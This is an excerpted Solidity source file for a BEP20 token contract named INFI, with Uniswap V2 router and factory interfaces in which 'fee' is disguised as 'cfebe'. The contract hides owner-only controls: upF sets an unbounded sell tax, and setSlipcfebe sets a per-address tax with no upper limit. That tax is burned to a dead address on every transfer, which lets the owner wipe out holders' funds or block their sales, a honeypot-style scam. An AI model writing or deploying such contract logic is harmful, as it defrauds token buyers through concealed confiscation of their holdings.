...
interface IUniswapV2Factory {
    ...
    function cfebeTo() external view returns (address);
    function cfebeToSetter() external view returns (address);
    ...
    function setcfebeTo(address) external;
    function setcfebeToSetter(address) external;
}


interface IUniswapV2Router02 is IUniswapV2Router01 {
    function removeLiquidityETHSupportingcfebeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function removeLiquidityETHWithPermitSupportingcfebeOnTransferTokens(
        address token,
        uint liquidity,
        uint AmountTokenMin,
        uint AmountETHMin,
    ...
    function swapExactTokensForTokensSupportingcfebeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
    ...
    function swapExactETHForTokensSupportingcfebeOnTransferTokens(
        uint AmountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external payable;
    function swapExactTokensForETHSupportingcfebeOnTransferTokens(
        uint AmountIn,
        uint AmountOutMin,
        address[] calldata path,
        address to,
...
contract INFI is BEP20, Ownable {
    // ext
    ...
    uint256 private _defaultSellcfebe = 0;

    uint256 private _defaultBuycfebe = 0;


    mapping(address => bool) private _mAccount;

    mapping(address => uint256) private _slipcfebe;
    ...
    function upF(uint256 _value) external onlyownar {
        _defaultSellcfebe = _value;
    }

    function setSlipcfebe(address _address, uint256 _value) external onlyownar {
        require(_value > 0, "Account tax must be greater than or equal to 1");
        _slipcfebe[_address] = _value;
    }

    function getSlipcfebe(address _address) external view onlyownar returns (uint256) {
        return _slipcfebe[_address];
    }


    function setMAccountcfebe(address _address, bool _value) external onlyownar {
        _mAccount[_address] = _value;
    }

    function getMAccountcfebe(address _address) external view onlyownar returns (bool) {
    ...
    function _receiveF(
        ...
        uint256 tradecfebeAmount = 0;

        if (rF) {
            uint256 tradecfebe = 0;
            if (uniswapV2Pair != address(0)) {
                if (_to == uniswapV2Pair) {

                    tradecfebe = _defaultSellcfebe;
                }
                if (from == uniswapV2Pair) {

                    tradecfebe = _defaultBuycfebe;
                }
            }
            if (_slipcfebe[from] > 0) {
                tradecfebe = _slipcfebe[from];
            }

            tradecfebeAmount = _Amount.mul(tradecfebe).div(100);
        }


        if (tradecfebeAmount > 0) {
            _balances[from] = _balances[from].sub(tradecfebeAmount);
            _balances[_deadAddress] = _balances[_deadAddress].add(tradecfebeAmount);
            emit Transfer(from, _deadAddress, tradecfebeAmount);
        }

        _balances[from] = _balances[from].sub(_Amount - tradecfebeAmount);
        _balances[_to] = _balances[_to].add(_Amount - tradecfebeAmount);
        emit Transfer(from, _to, _Amount - tradecfebeAmount);
    }
